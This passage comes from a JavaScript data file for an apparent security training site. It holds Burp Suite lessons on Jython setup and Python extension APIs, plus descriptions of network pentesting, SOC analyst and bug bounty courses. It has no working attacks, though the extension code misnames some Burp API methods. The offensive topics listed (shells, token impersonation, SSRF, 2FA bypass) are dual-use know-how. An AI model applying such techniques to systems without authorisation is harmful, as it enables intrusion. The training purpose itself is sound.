              "ActiveScanPlusPlus, BurpBounty, Turbo Intruder, JSON Web Tokens, Param Miner",
          },
          {
            key: 'mod4_4_1',
            title: 'Jython Setup & Python Extensions',
            content:
              "Jython lets you write Burp extensions in Python instead of Java. Here is how to set it up.\n\n" +
              "Installing Jython:\n" +
              "wget https://repo1.maven.org/maven2/org/python/jython-standalone/2.7.3/jython-standalone-2.7.3.jar\n\n" +
              "Configure in Burp:\n" +
              "Extender > Options > Python Environment\n" +
              "Browse > select jython-standalone-2.7.3.jar\n" +
              "Click Load Python Environment\n\n" +
              "Minimal Python extension example:\n" +
              "from burp import IBurpExtender\n\n" +
              "class BurpExtender(IBurpExtender):\n" +
              "    def registerBurpCallbacks(self, callbacks):\n" +
              "        callbacks.setExtensionName(\"My Python Extension\")\n" +
              "        print(\"Python extension loaded successfully!\")\n" +
              "        callbacks.registerHttpListener(self)\n\n" +
              "    def processHttpMessage(self, toolName, isRequest, messageInfo):\n" +
              "        pass\n\n" +
              "Testing your extension:\n" +
              "1. Load the .py file in Extender > Add > Select file\n" +
              "2. Check the Output tab for print statements\n" +
              "3. Any exceptions shown in Errors tab\n" +
              "4. If it crashes Burp, the error trace helps debug",
          },
          {
            key: 'mod4_4_2',
            title: 'Calling Burp APIs from Python',
            content:
              "The full Burp API lets you do almost anything programmatically. Here are the most useful patterns.\n\n" +
              "Working with the Site map:\n" +
              "siteMap = callbacks.getSiteMap(None)  # None = all\n\n" +
              "for entry in siteMap:\n" +
              "    url = entry.getUrl()\n" +
              "    if \"api\" in str(url):\n" +
              "        print(url.toString())\n\n" +
              "Custom active scan checks:\n" +
              "from burp import IScannerCheck\n\n" +
              "class CustomScanner(IScannerCheck):\n" +
              "    def doPassiveScan(self, httpService, requestInfo):\n" +
              "        issues = []\n" +
              "        response = requestInfo.getResponse()\n" +
              "        if response:\n" +
              "            body = self.helpers.bytesToString(response)\n" +
              "            if \"X-Powered-By: Express\" in body:\n" +
              "                pass  # Add issue\n" +
              "        return issues\n\n" +
              "Generating reports programmatically:\n" +
              "callbacks.getScanQueue()  # all active scan items\n" +
              "callbacks.generateReport(...)  # built-in report generation\n\n" +
              "Best resources:\n" +
              "- PortSwigger API documentation: support.portswigger.net\n" +
              "- Community extensions on GitHub (search: burp extension python)\n" +
              "- Burp Macros and Extensions course by Pentester Academy",
          },
        ],
      },
    ],
  },

  // ── NEW COURSES ────────────────────────────────────
  {
    id: 5,
    title: 'Network Penetration Testing',
    description: 'Go from nmap to shells. Covers SMB enumeration, DNS attacks, token impersonation, port forwarding, and full domain dominance. Hands-on with real network segments.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate – Advanced',
    duration: '16 hours',
    lessons: 22,
    image: '🌐',
    modules: [mod17, mod18, mod19, mod20],
  },
  {
    id: 6,
    title: 'Blue Team SOC Analyst',
    description: 'Splunk SIEM, Windows and Linux log analysis, incident response, malware analysis, threat hunting with Volatility, and digital forensics. Meets CREST/Cyber Defender entry-level cert requirements.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate',
    duration: '14 hours',
    lessons: 20,
    image: '🛡️',
    modules: [mod21, mod22, mod23, mod24],
  },
  {
    id: 7,
    title: 'Bug Bounty Hunter',
    description: 'From recon to report. Subdomain enumeration, GitHub OSINT, SSRF/XXE exploitation, race conditions, JWT attacks, IDOR, 2FA bypass, and professional report writing. Real bug bounty methodology.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate – Advanced',
    duration: '12 hours',
    lessons: 20,
    image: '🎯',
    modules: [mod25, mod26, mod27, mod28],
  },
];
